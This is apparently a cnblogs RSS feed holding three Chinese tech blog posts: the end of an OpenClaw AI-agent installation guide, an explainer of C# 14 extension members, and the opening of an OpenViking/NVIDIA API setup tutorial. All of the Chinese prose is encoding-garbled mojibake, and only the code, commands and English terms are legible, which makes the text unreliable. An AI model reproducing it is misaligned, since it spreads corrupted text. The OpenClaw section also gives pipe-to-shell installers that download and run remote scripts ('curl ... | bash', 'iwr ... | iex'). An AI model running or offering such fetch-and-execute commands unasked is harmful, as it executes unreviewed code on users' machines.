<p>æ­£å¦ä¹åæè¯´ï¼OpenClaw æ¬è´¨ä¸æ¯ä¸ä¸ªç³»ç»æå¡ï¼è¿æå³çåä¸äºè¦èµäºå®è¾å¤§çæä½æéï¼åºäºå®å¨æ¹é¢çèèï¼æä¸ªäººä¸å»ºè®®ç¨æ·å°å¶å®è£å¨èªå·±æ¥å¸¸çå·¥ä½è®¾å¤ä¸ãå¦å¤ï¼å¦ææ³æå¤§éåº¦å°åæ¥ OpenClaw çåè½ï¼æå¥½è¦è½è®©å®é¿æ¶é´æç»­è¿è¡ï¼å¹¶æ§è¡ä¸å®ç¨åº¦çå®éè®¾å¤ç®¡çè½åãå æ­¤ï¼æä»¬å¨å®è£ OpenClaw æ¶éå¸¸éè¦æ§è¡çæä½å¦ä¸ï¼</p>
<ul>
<li>
<p>éç½®å¥½ä¸å°å¯ä¸æä»¬æ¥å¸¸å·¥ä½è®¾å¤ç¸è¿éçç¬ç«è®¡ç®æºï¼å¦æä»ç¨äºå­¦ä¹ ç®çï¼ä¹å¯ä»¥æ¯ä¸å°èææºï¼ï¼å¹¶å¨å¶ä¸­å®è£å¥½æä½ç³»ç»ä¸ Node.js 22.x ä»¥ä¸çæ¬çè¿è¡ç¯å¢ã</p>
</li>
<li>
<p>å¨è¿å°ç¬ç«è®¡ç®æºä¸æå¼å½ä»¤è¡ç»ç«¯ï¼å¹¶æ§è¡<code>npm install -g openclaw@latest</code>å½ä»¤æ¥å®è£ OpenClawãå½ç¶äºï¼è¿æ¯ä½¿ç¨è·¨å¹³å°çæ¹å¼ãå¦æè¯»èä¸æ³ä½¿ç¨ NPMï¼ä¹å¯ä»¥éè¿ç´æ¥æ§è¡ bash/powershell çå®è£èæ¬æ¥å®æè¿ä¸ªæä½ï¼ç¸å³å½ä»¤å¦ä¸ï¼</p>
<pre><code class="language-bash"># MacOS/Linux ç³»ç»ä¸ä½¿ç¨ bash èæ¬å®è£ï¼
curl -fsSL https://openclaw.ai/install.sh | bash
# Windows ç³»ç»ä¸ä½¿ç¨ powershell èæ¬å®è£ï¼
iwr -useb https://openclaw.ai/install.ps1 | iex
</code></pre>
</li>
<li>
<p>å¾å®è£å®æä¹åï¼ç»§ç»­æ§è¡<code>openclaw onboard --install-daemon</code>å½ä»¤æ¥å¯å¨æ°æå®è£åå¯¼ï¼å¦å¾ 10 æç¤ºï¼ï¼è¿ä¸æ­¥å®è£ OpenClaw çæå¡ç«¯ç»ä»¶ï¼ä¾å¦é£ä¹¦æºå¨äººãWhatsApp æºå¨äººç­ï¼ï¼å³äºè¿æ¹é¢çåå®¹ï¼è¯»èå¯åèæ¬æå¨âåèèµæâä¸èä¸­æä¾çè§é¢æç¨ï¼ãOpenClaw +é£ä¹¦çå·¥å·æµæ­å»ºè¿ç¨ãã</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218155800997-2144742020.png" class="lazyload"></p>
<p><strong>å¾ 10</strong>ï¼OpenClaw çå®è£åå¯¼</p>
</li>
<li>
<p>å¨éç½®å®ç¸å³æå¡ç«¯ç»ä»¶ä¹åï¼æä»¬è¿éè¦éè¿æ§è¡å¦ä¸å½ä»¤æ¥éç½® OpenClaw ç Gateway ç½å³ï¼</p>
<pre><code class="language-bash">openclaw channels login
openclaw gateway --port 18789
</code></pre>
<p>å¨è¿éï¼<code>--port</code>åæ°ç¨äºæå® OpenClaw Gateway ççå¬ç«¯å£ï¼å¦æè¯»èå¸æä½¿ç¨é»è®¤ç 18789 ç«¯å£ï¼åå¯ä»¥çç¥è¯¥åæ°ã</p>
</li>
<li>
<p>å¾ Gateway å¯å¨ä¹åï¼æä»¬å°±å¯ä»¥ä½¿ç¨æµè§å¨æå¼<code>http://localhost:18789</code>æ¥è®¿é® OpenClaw ç Web ç«¯äºï¼å¦ææä»¬è½çå°å¦å¾ 11 æç¤ºççé¢ï¼å°±è¯´æ OpenClaw å·²ç»æåå®è£å¹¶å®æäºåæ­¥çéç½®å·¥ä½ã</p>
  
<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218155717170-227815528.png" class="lazyload"></p>
<p><strong>å¾ 11</strong>ï¼OpenClaw ç Web ç«¯</p>
</li>
</ul>
<h4 id="æ­¥éª¤-2éç½®-openclaw-è°ç¨-opencode-çæ¹å¼">æ­¥éª¤ 2ï¼éç½® OpenClaw è°ç¨ OpenCode çæ¹å¼</h4>
<p>æªæ­¢å°ç®åä¸ºæ­¢ï¼æä»¬ä¸»è¦æ<strong>ä¸¤ç§æ¹å¼</strong>å¯ä»¥è®© OpenClaw ä½¿ç¨ OpenCode æ¥è¿æ¥ LLM å¹¶æ§è¡æå®çä»»å¡ãå¦æç¨æ·å·²è´­ä¹°äº OpenCode çå®æ¹æ¨¡åæå¡ï¼å³ OpenCode Zenï¼ï¼å¯ä»¥éæ©ç´æ¥ä½¿ç¨ OpenClaw èªå¸¦ç Zen æä»¶æ¥è°ç¨ OpenCodeï¼è¿ç§æ¹å¼çå·ä½æä½å¦ä¸ï¼</p>
<ul>
<li>
<p>åè·åå° OpenCode Zen ç API Keyï¼ç¶åéè¿æ§è¡å¦ä¸å½ä»¤ä¹ä¸ï¼å°å¶æ·»å å° OpenClaw çéç½®ä¸­ï¼</p>
<pre><code class="language-bash"># ä½¿ç¨äº¤äºå¼å½ä»¤ï¼è¿éè¦æ ¹æ®è¯¥å½ä»¤çæç¤ºè¾å¥ä½ ç API Key
openclaw onboard --auth-choice opencode-zen
# æéäº¤äºå¼å½ä»¤ï¼ç´æ¥å° API Key ä½ä¸ºåæ°ä¼ å¥
openclaw onboard --opencode-zen-api-key "&lt;ä½ ç API Key&gt;"
</code></pre>
</li>
<li>
<p>å¦æéè¦çè¯ï¼è¿å¯ä»¥éè¿æ§è¡å¦ä¸å½ä»¤æ¥è®¾ç½®èªå·±è¦ä½¿ç¨çé»è®¤æ¨¡åï¼</p>
<pre><code class="language-bash">openclaw config set agents.defaults.model.primary "opencode/claude-opus-4-6"
</code></pre>
</li>
</ul>
<p>å½ç¶äºï¼éæ©ä¸è¿°æ¹å¼éè¦ç¨æ·ä¸è®¡è¾æéè®¡è´¹æå¸¦æ¥çå¼éãå¦ææä»¬æ³ä½¿ç¨åè´¹ç LLM çè¯ï¼è­¬å¦  kimi-k2.5-freeï¼ï¼ä¹å¯ä»¥éè¿ç» OpenClaw å®è£ <code>opencode-to-openai</code>è¿æ ·çç¬¬ä¸æ¹æä»¶æ¥å®ç°ãè¿ç¬¬äºç§æ¹å¼çå·ä½æä½å¦ä¸ï¼</p>
<ul>
<li>
<p>å®è£<code>opencode-to-openai</code>æä»¶ï¼è¿éè¦éè¿æ§è¡å¦ä¸å½ä»¤æ¥å®æï¼</p>
<pre><code class="language-bash">git clone https://github.com/dxxzst/opencode-to-openai
cd opencode-to-openai
openclaw plugins install .
</code></pre>
</li>
<li>
<p>å®è£å®æåï¼éè¦æ§è¡å¦ä¸å½ä»¤æ¥éå¯ OpenClawï¼å¹¶ç¡®ä¿æä»¶å·²å¯ç¨ï¼</p>
<pre><code class="language-bash">openclaw gateway restart
</code></pre>
<p>å¨è¿éï¼å¦ææä»¬å¨ OpenClaw ä¸­å¯ç¨äºæä»¶ç½ååï¼å°±è¿éè¦éè¿æ§è¡å¦ä¸å½ä»¤å°è¯¥å å¥è¯¥ç½ååï¼</p>
<pre><code class="language-bash">openclaw config get plugins.allow --json
# åè®¾è¿å ["a","b"]

openclaw config set plugins.allow '["a","b","opencode-to-openai"]' --json
openclaw gateway restart
</code></pre>
</li>
<li>
<p>åæ­¥æ¨¡åå¹¶è®¤è¯ LLM æå¡ï¼è¿éè¦éè¿æ§è¡å¦ä¸å½ä»¤æ¥å®æï¼</p>
<pre><code class="language-bash">openclaw models auth login --provider opencode-to-openai --method local
</code></pre>
<p>å¦æä½ æ³é¡ºä¾¿è®¾ç½®é»è®¤æ¨¡åï¼</p>
<pre><code class="language-bash">openclaw models auth login --provider opencode-to-openai --method local --set-default
</code></pre>
</li>
<li>
<p>éæ©æ¨¡åï¼è¿éè¦éè¿æ§è¡å¦ä¸å½ä»¤æ¥å®æï¼</p>
<pre><code class="language-bash">openclaw models set opencode-to-openai/opencode/kimi-k2.5-free
</code></pre>
<p>å¨è¿éï¼å¦ææå¿å¯¹ LLM çè¯·æ±ä¼è¢«å¡ä½ï¼ä¹å¯ä»¥ç¨<code>useIsolatedHome=false</code>è¿ä¸ªæä»¶éç½®è®© OpenCode ä½¿ç¨çå® HOMEï¼å·ä½éç½®å½ä»¤å¦ä¸ï¼</p>
<pre><code class="language-bash">openclaw config set plugins.opencode-to-openai.useIsolatedHome false
</code></pre>
</li>
</ul>
<h4 id="æ­¥éª¤-3ä¸-openclaw-è¿è¡å¯¹è¯">æ­¥éª¤ 3ï¼ä¸ OpenClaw è¿è¡å¯¹è¯</h4>
<p>å¦æä¸è¿°æä½ä¸åé¡ºå©ï¼æä»¬å°±å¯ä»¥å¨æ­¥éª¤ 1 ä¸­éç½®å¥½ç Web ç«¯æé£ä¹¦ä¹ç±»çåºç¨ä¸­æå¼ä¸ OpenClaw çå¯¹è¯çªå£ï¼éè¿åéæç¤ºè¯æ¥è°åº¦ OpenCode å®æç¸å³ä»»å¡äºï¼å¦å¾ 12 æç¤ºï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218155645024-1895778692.png" class="lazyload"></p>
<p><strong>å¾ 12</strong>ï¼ä¸ OpenClaw çå¯¹è¯çªå£</p>
<p>å½ç¶äºï¼å¦ææ³è®©æç¤ºè¯åæ¥å°æå¤§çä½ç¨ï¼å¹¶å¨çäº§ç¯å¢ä¸­å®éä½¿ç¨ OpenClaw/OpenCode æ¥å®æå·ä½çé¡¹ç®ä»»å¡ï¼æä»¬è¿éè¦åéç½®ä¸ä¸ OpenClaw/OpenCode ææ¥å¥ç MCP æå¡å Agent Skills æºå¶äºãå³äºè¿é¨åçåå®¹ï¼æå°ä¼å¨ã[[Agent çè¿é¶åºç¨]]ãè¿ä¸ç¯ç¬è®°ä¸­è¿è¡è¯¦ç»ä»ç»ã</p>
<h2 id="ç»æè¯­">ç»æè¯­</h2>
<p>å¨å®æäºå¯¹ AI Agent çå­¦ä¹ ä¸å®è·µä¹åï¼ææä¸ºææ¾çä½ä¼ä¹ä¸æ¯ï¼Agent å¹¶æ²¡æè®©ç³»ç»åå¾æ´ç®åï¼åèè®©ç³»ç»çè¾¹çåå¾æ´å æ¸æ°ãä¸ä¼ ç»çèªå¨åèæ¬æå·¥å·ä¸åï¼Agent å¹¶ä¸æ¯ä¸ç»åºå®è§åçéåï¼èæ¯ä¸ä¸ªåºäºè¯­è¨æ¨¡åè¿è¡ä»»å¡çè§£ãè§åä¸æ§è¡çç³»ç»ç»ä»¶ãè¿æå³çï¼å¨å¾å¤åºæ¯ä¸ï¼å®æåçå¹¶ä¸æ¯âæé¢æè¿è¡âï¼èæ¯âå°½åå®æä»»å¡âã</p>
<p>æ­£å å¦æ­¤ï¼Agent çå¼å¥å¹¶æ²¡æåå¼±äººç±»å¨ç³»ç»ä¸­çä½ç¨ï¼åèå¯¹äººçå¤æ­è½åæåºäºæ´é«è¦æ±ï¼<br>
æä»¬éè¦è½å¤çè§£ Agent å¨åä»ä¹ãä¸ºä»ä¹è¿ä¹åï¼ä»¥åå¨ä»ä¹æåµä¸åºè¯¥ä»å¥ãä¿®æ­£çè³ä¸­æ­¢å®çè¡ä¸ºãä»è¿ä¸ªè§åº¦æ¥çï¼å­¦ä¹ åä½¿ç¨ AI Agentï¼å¹¶ä¸æå³çææ§å¶æå®å¨äº¤ç» AIï¼èæ¯å­¦ä¼å¦ä½å¨ä¸ä¸ªç± AI åä¸æ§è¡çç³»ç»ä¸­ï¼éæ°å®ä½äººçèè´£ä¸è¾¹çãè¿ä¹æ­£æ¯æ¬å­¦ä¹ é¶æ®µçæ ¸å¿ç®æ ã</p>
<h2 id="åèèµæ">åèèµæ</h2>
<ul>
<li>
<p>å®æ¹ææ¡£ï¼</p>
<ul>
<li><a href="https://code.claude.com/docs/zh-CN/overview?utm_source=copilot.com" target="_blank" rel="noopener nofollow">Claude Code å®æ¹ææ¡£</a></li>
<li><a href="https://opencode.doczh.com/docs/" target="_blank" rel="noopener nofollow">OpenCode å®æ¹ææ¡£</a></li>
<li><a href="https://claude.com/blog/extending-claude-capabilities-with-skills-mcp-servers" target="_blank" rel="noopener nofollow">åºäº Agent skills å MCP æå¡çååå·¥ä½æµ</a></li>
<li><a href="https://docs.openclaw.ai/zh-CN" target="_blank" rel="noopener nofollow">OpenClaw å®æ¹ææ¡£</a></li>
</ul>
</li>
<li>
<p>è§é¢æç¨ï¼</p>
<ul>
<li>Claude Code æç¨ï¼<a href="https://www.youtube.com/watch?v=AT4b9kLtQCQ" target="_blank" rel="noopener nofollow">YouTube é¾æ¥</a> / <a href="https://www.bilibili.com/video/BV14rzQB9EJj" target="_blank" rel="noopener nofollow">Bilibili é¾æ¥</a></li>
<li>OpenClaw +é£ä¹¦çå·¥å·æµæ­å»ºè¿ç¨ï¼<a href="https://www.youtube.com/watch?v=giv63OtX720" target="_blank" rel="noopener nofollow">YouTube é¾æ¥</a> / <a href="https://www.bilibili.com/video/BV1rvcpzDEsH" target="_blank" rel="noopener nofollow">Bilibili é¾æ¥</a></li>
</ul>
</li>
</ul>


</div>
<div class="clear"></div>

        <p class="postfoot">
            posted on 
<span id="post-date" data-last-update-days="0.03680555555555556" data-date-updated="2026-02-18 17:02">2026-02-18 16:09</span>&nbsp;
<a href="https://www.cnblogs.com/owlman">åæ°</a>&nbsp;
éè¯»(<span id="post_view_count">91</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19623216);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19623216', targetLink: 'https://www.cnblogs.com/owlman/p/19623216', title: 'AI å­¦ä¹ ç¬è®°ï¼Agent çåºç¡åºç¨' })">ä¸¾æ¥</a>

        </p>
     ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ .NET 10 & C# 14 New Features æ°å¢åè½ä»ç»-æ©å±æåExtension Members ]]></title>
    <link>https://www.cnblogs.com/tianqing/p/19622970</link>
    <guid>bc8bac31afaf466b5cd870058cb2a1d7</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/tianqing/p/19622970" title="åå¸äº 2026-02-18 11:20">
    <span role="heading" aria-level="2">.NET 10 &amp; C# 14 New Features æ°å¢åè½ä»ç»-æ©å±æåExtension Members</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p class="p1"><span class="s1">C# 14 å¼å¥äºå¯¹æ©å±æåï¼Extension Membersï¼çå¢å¼ºæ¯æï¼æ¬è´¨ä¸æ¯å¯¹ä¼ ç»âæ©å±æ¹æ³âæ¨¡åçä¸æ¬¡è¯­è¨çº§åçº§ï¼ä½¿å¶å¯ä»¥å®ä¹çä¸åä»éäºæ¹æ³ï¼</span></p>
<p class="p1"><span class="s1">èæ¯å¯ä»¥æ©å±æ´å¤æåå½¢æï¼ä¾å¦å±æ§ãè¿ç®ç¬¦ç­ï¼ã</span></p>
<p class="p1"><strong><span class="s1" style="font-size: 16px">ä¸ãä»æ©å±æ¹æ³å°æ©å±æå</span></strong></p>
<p class="p1">æ©å¨ <a><span class="s1">C# 3.0</span></a> ä¸­ï¼å°±å¼å¥äºâæ©å±æ¹æ³ï¼Extension Methodsï¼âï¼å¶åºå±æºå¶æ¯ï¼</p>
<ul>
<li>
<p class="p1"><span class="s1">å¿é¡»å®ä¹å¨ static class</span></p>
</li>
<li>
<p class="p1">æ¹æ³å¿é¡»æ¯ <span class="s1">static</span></p>
</li>
<li>
<p class="p1">ç¬¬ä¸ä¸ªåæ°ä½¿ç¨ <span class="s1">this T</span></p>
</li>
</ul>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">class</span><span style="color: rgba(0, 0, 0, 1)"> StringExtensions
{
    </span><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">bool</span> IsNullOrEmptyEx(<span style="color: rgba(0, 0, 255, 1)">this</span> <span style="color: rgba(0, 0, 255, 1)">string</span><span style="color: rgba(0, 0, 0, 1)"> value)
        </span>=&gt; <span style="color: rgba(0, 0, 255, 1)">string</span><span style="color: rgba(0, 0, 0, 1)">.IsNullOrEmpty(value);
}</span></pre>
</div>
<p>ä»æ¬è´¨ä¸çï¼</p>
<blockquote>ç¼è¯å¨å¨è¯­æ³å±é¢åâç³åå¤çâï¼æç»ä»ç¶æ¯éææ¹æ³è°ç¨ã</blockquote>
<p><span class="s1">LINQå°±æ¯æå¤§çåºç¨åºæ¯ã</span></p>
<p><strong><span class="s1" style="font-size: 16px">äºãC# 14ä¸­å¼å¥æ©å±æååç¤ºä¾è¯´æ</span></strong></p>
<p class="p1">C# 14 åè®¸å¨æ´èªç¶çè¯­æ³ç»æä¸­å£°ææ©å±æåï¼ä¸åå±éäºâéæç±» + this åæ°âæ¨¡å¼ï¼èæ¯æ¯æç±»ä¼¼ï¼</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">class</span><span style="color: rgba(0, 0, 0, 1)"> Enumerable
{
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> Extension block</span>
    extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source) <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> extension members for IEnumerable&lt;TSource&gt;</span>
<span style="color: rgba(0, 0, 0, 1)">    {
        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> Extension property:</span>
        <span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">bool</span> IsEmpty =&gt; !<span style="color: rgba(0, 0, 0, 1)">source.Any();

        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> Extension method:</span>
        <span style="color: rgba(0, 0, 255, 1)">public</span> IEnumerable&lt;TSource&gt; Where(Func&lt;TSource, <span style="color: rgba(0, 0, 255, 1)">bool</span>&gt;<span style="color: rgba(0, 0, 0, 1)"> predicate) { ... }
    }

    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> extension block, with a receiver type only</span>
    extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt;) <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> static extension members for IEnumerable&lt;Source&gt;</span>
<span style="color: rgba(0, 0, 0, 1)">    {
        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> static extension method:</span>
        <span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> IEnumerable&lt;TSource&gt; Combine(IEnumerable&lt;TSource&gt; first, IEnumerable&lt;TSource&gt;<span style="color: rgba(0, 0, 0, 1)"> second) { ... }

        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> static extension property:</span>
        <span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> IEnumerable&lt;TSource&gt; Identity =&gt; Enumerable.Empty&lt;TSource&gt;<span style="color: rgba(0, 0, 0, 1)">();

        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> static user defined operator:</span>
        <span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> IEnumerable&lt;TSource&gt; <span style="color: rgba(0, 0, 255, 1)">operator</span> + (IEnumerable&lt;TSource&gt; left, IEnumerable&lt;TSource&gt; right) =&gt;<span style="color: rgba(0, 0, 0, 1)"> left.Concat(right);
    }
}</span></pre>
</div>
<p class="p1"><span class="s1">å®ä¹çæ¯ä¸ä¸ª extension block<span class="s1">ï¼ç®æ ç±»åæ¯ï¼IEnumerable&lt;TSource&gt;</span></span></p>
<p class="p1">ä»£ç åæä¸¤ç±» extension blockï¼ãã</p>
<ol start="1">
<li>
<p class="p1"><strong>å®ä¾æ©å±æå</strong></p>
</li>
<li>
<p class="p1"><strong>éææ©å±æå</strong></p>
</li>
</ol>
<p>â  å®ä¾æ©å±æåï¼extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source)&nbsp;</p>
<ul>
<li>
<p class="p1"><span class="s1">source æ¯æ¥æ¶èï¼receiverï¼</span></p>
</li>
<li>
<p class="p1"><span class="s1">ç±»ä¼¼æ§è¯­æ³ç this IEnumerable&lt;TSource&gt; source</span></p>
</li>
<li>
<p class="p1">ä½è¯­æ³æ´æ¥è¿çæ­£âä¸ºç±»åæ·»å æåâ</p>
</li>
</ul>
<p>&nbsp;æ©å±å±æ§ï¼public bool IsEmpty =&gt; !source.Any();</p>
<p class="p1">&nbsp;ç¼è¯å¨ä¼çæï¼public static bool get_IsEmpty&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source)</p>
<p class="p1">&nbsp;ä»£ç è°ç¨ï¼list.IsEmpty</p>
<p class="p1">&nbsp;ä¼è¢«ç¼è¯ä¸ºï¼Enumerable.get_IsEmpty(list)</p>
<p class="p1">&nbsp;å¶æ¬è´¨ä»ç¶æ¯ï¼</p>
<blockquote>éææ¹æ³ + è¯­æ³ç³ç»å®</blockquote>
<p class="p1">ä½å¨è¯­ä¹å±é¢ï¼å®å·²ç»ä¸åæ¯âå·¥å·æ¹æ³âï¼èæ¯âç±»åè½åâã</p>
<p class="p1">æ©å±æ¹æ³ï¼public IEnumerable&lt;TSource&gt; Where(Func&lt;TSource, bool&gt; predicate)</p>
<p class="p1">å³å¢å¼ºåæLINQçWhereåè½</p>
<p class="p1"><span class="s1">å¦æç³»ç»ä¸­å·²æ System.Linq.Enumerable.Where<span class="s1">ï¼</span></span></p>
<ul>
<li>
<p class="p1">å®ä¾æåä¼å</p>
</li>
<li>
<p class="p1">ç¶åææ¯ extension block</p>
</li>
<li>
<p class="p1">åæ¯ using å¼å¥çæ©å±æ¹æ³</p>
</li>
</ul>
<p>&nbsp;ä¸ä¼ç ´åå·²æ APIï¼åªæ¯åä¸åééã</p>
<p class="p1">â¡ éææ©å±æå</p>
<p class="p1">extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt;)</p>
<p class="p1">è¿éæ²¡æ receiver åéåã</p>
<blockquote>ä¸ºç±»åæ¬èº«æ·»å âéææ©å±æåâ</blockquote>
<p class="p1">æ¾ä¸ä¸ªéææ©å±æ¹æ³</p>
<p class="p1">public static IEnumerable&lt;TSource&gt; Combine(...)</p>
<p class="p1">ä»£ç è°ç¨ï¼IEnumerable&lt;int&gt;.Combine(a, b);</p>
<p class="p1">ç¼è¯å¨ä¼è½¬åä¸ºï¼Enumerable.Combine(a, b);</p>
<p class="p1">åçä¸ä¸ªéææ©å±å±æ§</p>
<p class="p1">public static IEnumerable&lt;TSource&gt; Identity</p>
<p class="p1">ä»£ç è°ç¨ï¼IEnumerable&lt;int&gt;.Identity</p>
<p class="p1">è¿å¨æ§æ©å±æ¹æ³ä½ç³»ä¸­æ¯æ æ³è¡¨è¾¾çã</p>
<p class="p1">åçä¸ä¸ªæ©å±è¿ç®ç¬¦</p>
<p class="p1">public static IEnumerable&lt;TSource&gt; operator +</p>
<p class="p1">è¿æ¯ C# 14 çéå¤§å¢å¼ºç¹ãç°å¨ä½ å¯ä»¥åï¼</p>
<p class="p1">var result = list1 + list2;</p>
<p class="p1">ç­ä»·äºï¼Enumerable.op_Addition(list1, list2);</p>
<p class="p1"><strong><span style="font-size: 16px">ä¸ãåºå±ç¼è¯æºå¶</span></strong></p>
<p class="p1">&nbsp;<strong>ä¸ä¿®æ¹ CLR åæ°æ®</strong></p>
<ul>
<li>
<p class="p1"><span class="s1">ä¸æ¹å IEnumerable&lt;T&gt;</span></p>
</li>
<li>
<p class="p1">ä¸å¢å çå®æå</p>
</li>
</ul>
<p>&nbsp;<strong>IL ä»ç¶æ¯éææ¹æ³</strong></p>
<p>&nbsp; &nbsp;æææåé½ä¼çæï¼&nbsp;public static ...</p>
<p class="p1">&nbsp;<strong>è¯­ä¹ç»å®ç±ç¼è¯å¨å®æ</strong></p>
<p class="p1">æ©å±æåè§£æè§åï¼</p>
<ol start="1">
<li>
<p class="p1">å®ä¾çå®æå</p>
</li>
<li>
<p class="p1">å namespace extension block</p>
</li>
<li>
<p class="p1">using å¯¼å¥ extension block</p>
</li>
</ol>
<p>&nbsp;<strong><span style="font-size: 16px">åãä¸ä¼ ç»æ©å±æ¹æ³å¯¹æ¯</span></strong></p>
<p>&nbsp; &nbsp;<img src="https://img2024.cnblogs.com/blog/23525/202602/23525-20260218111804828-477864692.png" alt="image" width="657" height="246" loading="lazy"></p>
<p>åæ¶ï¼é¶è¿è¡æ¶å¼éã</p>
<ul>
<li>
<p class="p1">æ åå°</p>
</li>
<li>
<p class="p1">æ å¨æä»£ç</p>
</li>
<li>
<p class="p1">æ è£é¥°å¨</p>
</li>
<li>
<p class="p1">æ è¿è¡æ¶æ³¨å¥</p>
</li>
</ul>
<p>&nbsp;å®å¨ç¼è¯æç»å®ã</p>
<blockquote>ç¼è¯å¨çº§è¯­ä¹å¢å¼ºï¼ä¸æ¹åè¿è¡æ¶ç±»åç»æã</blockquote>
<p>&nbsp;</p>
<p>&nbsp;ä»¥ä¸åäº«ç»å¤§å®¶ã</p>
<p>&nbsp;</p>
<p>å¨å½åº</p>
<p>20260218</p>
<p class="p1">&nbsp;</p>
<p class="p1">&nbsp;</p>
<p class="p1">&nbsp;</p>
<p class="p1">&nbsp;</p>
<p>&nbsp;</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-18 11:20">2026-02-18 11:20</span>&nbsp;
<a href="https://www.cnblogs.com/tianqing">Eric zhou</a>&nbsp;
éè¯»(<span id="post_view_count">128</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19622970);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19622970', targetLink: 'https://www.cnblogs.com/tianqing/p/19622970', title: '.NET 10 &amp;amp; C# 14 New Features æ°å¢åè½ä»ç»-æ©å±æåExtension Members' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ OpenClaw+OpenViking + NVIDIA API éç½®æç¨ ]]></title>
    <link>https://www.cnblogs.com/swizard/p/19622926</link>
    <guid>f666ac2f677d945355ac420bb03a9781</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/swizard/p/19622926" title="åå¸äº 2026-02-18 10:56">
    <span role="heading" aria-level="2">OpenClaw+OpenViking + NVIDIA API éç½®æç¨</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>æ¬æç¨ä»ç»å¦ä½å¨ OpenClaw ç¯å¢ä¸­éç½® OpenVikingï¼ä½¿ç¨ NVIDIA NIM API ä½ä¸º Embedding å VLM åç«¯ã</p>
</blockquote>
<h2 id="ä»ä¹æ¯-openviking">ä»ä¹æ¯ OpenVikingï¼</h2>
<p>OpenViking æ¯ç«å±±å¼æå¼æºç <strong>AI Agent ä¸ä¸ææ°æ®åº</strong>ãå®ç¨"èææä»¶ç³»ç»"çæ¹å¼ç®¡ç Agent çè®°å¿ãèµæºåæè½ï¼æä¾ï¼</p>
<ul>
<li><strong>åå±ä¸ä¸æ</strong>ï¼L0æè¦ / L1æ¦è§ / L2å¨æï¼æéå è½½èç Token</li>
<li><strong>è¯­ä¹æç´¢</strong>ï¼èåç®å½å®ä½ä¸åéæ£ç´¢</li>
<li><strong>èªå¨æè¦</strong>ï¼VLM èªå¨çæææ¡£æè¦åæ¦è§</li>
<li><strong>ä¼è¯è®°å¿</strong>ï¼èªå¨æåå¯¹è¯ä¸­çé¿æè®°å¿</li>
</ul>
<p>GitHub: <a href="https://github.com/volcengine/OpenViking" target="_blank" rel="noopener nofollow">https://github.com/volcengine/OpenViking</a></p>
<h2 id="åç½®æ¡ä»¶">åç½®æ¡ä»¶</h2>
<ul>
<li>Python 3.9+</li>
<li>NVIDIA NIM API Keyï¼<a href="https://build.nvidia.com/" target="_blank" rel="noopener nofollow">åè´¹æ³¨å</a>ï¼</li>
<li>ç¨³å®çç½ç»è¿æ¥</li>
</ul>
<hr>
<h2 id="ç¬¬ä¸æ­¥å®è£-openviking">ç¬¬ä¸æ­¥ï¼å®è£ OpenViking</h2>
<pre><code class="language-bash">pip install openviking
</code></pre>
<hr>
<h2 id="ç¬¬äºæ­¥åå»ºéç½®æä»¶">ç¬¬äºæ­¥ï¼åå»ºéç½®æä»¶</h2>
